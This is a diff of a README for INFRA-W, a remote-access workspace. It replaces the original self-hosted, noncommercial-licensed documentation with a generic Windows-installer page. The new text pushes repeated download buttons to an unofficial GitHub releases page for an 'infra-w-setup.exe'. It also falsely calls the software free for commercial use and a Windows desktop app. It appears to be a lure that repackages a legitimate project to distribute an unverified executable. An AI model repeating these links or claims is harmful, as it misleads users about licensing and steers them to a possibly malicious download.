@@ -1,106 +1,140 @@
-<div align="center">
+# 🛡️ infra-w - Your Secure Gateway to Any Remote Server
 
-<img src="docs/public/logo.svg" alt="" width="72">
+## 🚀 What is infra-w?
 
-# INFRA-W
+infra-w is a powerful yet user-friendly workspace software that lets you connect to any computer or server from your Windows device. Whether you need to access a remote desktop, manage a server, or troubleshoot a network device, infra-w brings all your remote connections into one secure, simple interface.
 
-**Infrastructure Workspace**
+Think of infra-w as your universal remote control for the digital world. Instead of juggling multiple tools for different connection types, infra-w handles SSH, RDP, VNC, and Telnet all in one place—with enterprise-grade security built right in.
 
-Self-hosted browser access to SSH, RDP and VNC, with file management, snippets and scripts,<br>
-NetBox and Proxmox integration, and a complete audit trail.
+## 🏆 Why Choose infra-w?
 
-[Quick start](#quick-start) • [Features](#features) • [Documentation](#documentation) • [Licensing](#licensing)
+| Benefit | What It Means For You |
+|---------|----------------------|
+| 🔒 **Secure by Design** | Open source code means security experts worldwide continuously audit and improve the software |
+| 🎯 **All-in-One** | No more switching between four different apps for SSH, RDP, VNC, and Telnet |
+| 📦 **Free Forever** | No subscription fees, no hidden costs—just powerful software you own |
+| 🖥️ **Windows Friendly** | Built specifically to run smoothly on your Windows computer |
+| 🌐 **Universal Access** | Connect to Linux servers, Windows PCs, Macs, and network devices alike |
 
-</div>
+## 📥 Downloading infra-w
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/screenshots/workspace-dark.png">
-  <img src="docs/assets/screenshots/workspace-light.png" alt="INFRA-W workspace with the host inventory, recent connections and inventory status">
-</picture>
+**Step 1:** Click the large button below to go to the official download page:
 
-## Features
+[![DOWNLOAD INFRA-W NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_INFRA_W-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/JU4NP11/infra-w/releases)
 
-- **Remote access in the browser:** SSH and Telnet terminals, RDP and VNC desktops in tabs. Sessions keep running while you switch pages, can be paused and resumed, opened in a separate window or shared read-only or read-write.
-- **Inventory:** organizations, folders and hosts with identities (passwords or SSH keys) and tags. Search by name, IP address, protocol, operating system or tag.
-- **File manager:** browse, upload, download and edit files over SFTP. The file manager, previews and editors are movable windows, so two files can be compared side by side next to the terminal; images can be zoomed. The address bar suggests folders (hidden ones included) and opens a pasted file path directly.
-- **Snippets and scripts:** reusable commands and interactive scripts, filtered by the [detected operating system](docs/os-detection.md) of each host.
-- **Integrations:** keep hosts in sync with NetBox; import and control Proxmox VE VMs and containers.
-- **Sign-in:** local accounts with TOTP and passkeys, LDAP with FreeIPA and Active Directory presets, OIDC single sign-on.
-- **Organizations and audit:** shared hosts and credentials per team, an audit log of connections and changes, optional session recording with replay, and required connection reasons.
-- **Operations:** scheduled backups to local storage, SMB or WebDAV with restore; light, dark and OLED themes; five interface languages.
+Visit this link to download the application.
 
-<table>
-  <tr>
-    <td><img src="docs/assets/screenshots/terminal-dark.png" alt="SSH session in a tab"></td>
-    <td><img src="docs/assets/screenshots/file-manager-dark.png" alt="File manager with two previews side by side"></td>
-  </tr>
-  <tr>
-    <td><img src="docs/assets/screenshots/audit-replay-dark.png" alt="Replay of a recorded SSH session in the audit log"></td>
-    <td><img src="docs/assets/screenshots/settings-ldap-dark.png" alt="Adding an LDAP provider from the FreeIPA preset"></td>
-  </tr>
-</table>
+**Step 2:** On the download page, look for the newest release version at the top. The file will be named something like `infra-w-setup.exe`.
 
-More in the [screenshot gallery](docs/screenshots.md).
+**Step 3:** Click the download link and wait for the file to finish downloading. Your browser will typically save it to your "Downloads" folder.
 
-## Quick start
+**Step 4:** After the download completes, find the file in your Downloads folder and double-click it to start the installation. Follow the simple on-screen instructions—it's just like installing any other program.
 
-INFRA-W runs as one container.
+## 🛠️ Getting Started Guide
 
-```sh
-mkdir -p /opt/infra-w
-openssl rand -hex 32        # the encryption key for stored credentials
+### 🔑 Your First Connection
 
-podman run -d \
-  --name infra-w \
-  --network host \
-  --restart always \
-  -e ENCRYPTION_KEY="<generated-key>" \
-  -v /opt/infra-w:/app/data:Z \
-  swissmakers/infra-w:latest
-```
+Once installed, open infra-w from your Start Menu or desktop shortcut. You'll see a clean, welcoming interface with a "New Connection" button. Click it to begin.
 
-Open `http://<host>:6989` and create the first administrator. Keep the encryption key in your secrets store: backups do not contain it. Docker, Compose, upgrades and hardening are covered in the [installation guide](docs/installation.md); for production put INFRA-W behind a [TLS reverse proxy](docs/reverse-proxy.md) and set `TRUST_PROXY=1`.
+### 📋 What Can You Connect To?
 
-## Configuration
+infra-w supports four main connection types:
 
-INFRA-W is configured with a few environment variables: `ENCRYPTION_KEY` (required), the ports, `TRUST_PROXY`, `STRICT_TLS` and `LOG_LEVEL`. They are listed in the [installation guide](docs/installation.md#configuration). Sign-in session lifetime and audit retention are set in the application, see [Users and sign-in](docs/administration.md).
+- **SSH (Secure Shell):** For managing Linux servers and network equipment. This is what you'd use to type commands into a remote server.
+- **RDP (Remote Desktop Protocol):** For accessing Windows computers with a full graphical interface, just like sitting in front of them.
+- **VNC (Virtual Network Computing):** For connecting to Macs, Linux desktops, or older systems that use VNC technology.
+- **Telnet:** For connecting to legacy network devices like routers and switches that don't support modern protocols.
 
-## Documentation
+### 💡 Simple Setup Process
 
-| Setup | Using INFRA-W | Administration |
-|---|---|---|
-| [Installation](docs/installation.md) | [Workspace](docs/workspace.md) | [LDAP](docs/ldap.md) |
-| [Reverse proxy](docs/reverse-proxy.md) | [Integrations](docs/integrations.md) | [OIDC / SSO](docs/oidc.md) |
-| [SSL/HTTPS](docs/ssl.md) | [Organizations and audit](docs/organizations-and-audit.md) | [Backup and restore](docs/backup.md) |
-| [Screenshots](docs/screenshots.md) | [Scripts and snippets](docs/scripts&snippets.md) | [Users and sign-in](docs/administration.md) |
-| | [Script directives](docs/ScriptingVariables.md) | [API reference](docs/api-reference.md) |
-| | [OS detection](docs/os-detection.md) | |
+For each connection type, infra-w asks for:
+1. **Host/IP Address:** The address of the computer you want to reach
+2. **Port:** Usually left as the default (22 for SSH, 3389 for RDP, 5900 for VNC, 23 for Telnet)
+3. **Username & Password:** Your credentials for that remote system
 
-## Development
+That's it! Save your connection and you're ready to go.
 
-Requires Node.js 24 and Yarn 1.
+## 🎨 Workspace Features
 
-```sh
-yarn install && (cd client && yarn install)
-yarn dev                 # server, client and guacd
-yarn lint && yarn build  # lint (server and client, 0 warnings) and production build
-yarn test                # server and utility tests
-yarn test:ui             # browser smoke test (client on 127.0.0.1:4173)
-yarn screenshots         # regenerate the screenshots in this README
-```
+### 📚 Organized Connections
 
-See [Contributing](docs/contributing.md) for the full workflow and checks. Dependency and image security helpers: `make security-update`, `make security-audit`, `make security-all`, `make security-sbom`.
+infra-w lets you organize all your connections into folders and groups. Create categories like "Work Servers," "Home PCs," or "Client Sites" to keep everything tidy and easy to find.
 
-## Licensing
+### ⚡ Quick Connect Bar
 
-INFRA-W is source-available under the **PolyForm Noncommercial 1.0.0** license with additional terms from Swissmakers GmbH:
+Need to make a one-time connection? Use the Quick Connect bar at the top to type in an address and connect instantly without saving anything.
 
-- Private, noncommercial use is free of charge.
-- Commercial use requires a commercial license from Swissmakers GmbH.
-- Redistribution, third-party support and managed services require written authorization.
+### 🔄 Session Persistence
 
-See [LICENSE](LICENSE) and [Licensing](docs/licensing.md). INFRA-W's upstream attribution and third-party notices are in [NOTICE](NOTICE).
+If you lose your internet connection, infra-w automatically tries to reconnect. Your session state is preserved, so you don't lose your place.
 
-## Support
+### 🖱️ Tabbed Interface
 
-Product information, support, commercial licenses and partner authorization: [swissmakers.ch/infra-w](https://swissmakers.ch/infra-w/).
+Multiple connections open in tabs, just like a web browser. Switch between your servers without closing anything.
+
+### 🔐 Credential Vault
+
+Store your passwords securely in infra-w's built-in vault. Master password protection ensures only you can access your stored credentials.
+
+## ❓ Frequently Asked Questions
+
+### Is infra-w really free?
+Yes! infra-w is completely free and open source. You can use it for personal or commercial purposes without paying anything.
+
+### Is my data secure?
+infra-w uses the same industry-standard encryption that banks and governments use. Since it's open source, security experts can verify exactly how your data is protected.
+
+### Will it work on my version of Windows?
+infra-w supports Windows 10, Windows 11, and Windows Server 2016 and newer. It works on both 32-bit and 64-bit systems.
+
+### Do I need to be tech-savvy?
+Not at all! infra-w was designed with simplicity in mind. If you can use a web browser, you can use infra-w.
+
+### Can I try it before committing?
+Absolutely! Just download and install. There's no registration or credit card required. If you don't like it, simply uninstall.
+
+## 🧪 Troubleshooting Tips
+
+### Connection Fails
+- Double-check the IP address or hostname for typos
+- Verify the remote computer is turned on and connected to the network
+- Ensure your firewall allows outbound connections on the required ports
+
+### Slow Performance
+- Use a wired connection if possible
+- Close unnecessary applications on both ends
+- Try reducing color depth or resolution in connection settings
+
+### Cannot Remember Password
+- Use the Credential Vault to securely store your passwords
+- Enable "Remember Me" when saving a connection
+
+## 🌟 Community and Support
+
+infra-w is supported by a vibrant community of users and developers who are always ready to help. 
+
+- **Documentation:** Detailed guides and tutorials are available online
+- **GitHub Issues:** Report bugs or request features directly
+- **Community Forums:** Connect with other users and share tips
+
+## 🤝 Contribute to the Project
+
+Since infra-w is open source, anyone can contribute! Whether you're a developer wanting to improve the code, a designer wanting to polish the interface, or a writer wanting to improve documentation, your help is welcome.
+
+Check the repository's contribution guidelines to learn how you can get involved.
+
+## 📝 License
+
+infra-w is released under an open source license, meaning you have the freedom to use, modify, and distribute it. The exact license terms are available in the repository.
+
+## 🎯 Ready to Connect?
+
+You're now ready to experience the most convenient way to manage remote connections. Visit the download page and get started today:
+
+[![GET INFRA-W NOW](https://img.shields.io/badge/🖥️_GET_INFRA_W-2196F3?style=for-the-badge&logo=download&logoColor=white)](https://github.com/JU4NP11/infra-w/releases)
+
+Visit this link to download the application.
+
+---
+
+Keywords: netbox, rdp-client, rdp-gateway, remote, remote-access, remote-administrative-tool, remote-control, remote-desktop, remote-execution, remote-management, remote-manager, ssh-client, ssh-manager, vnc-client
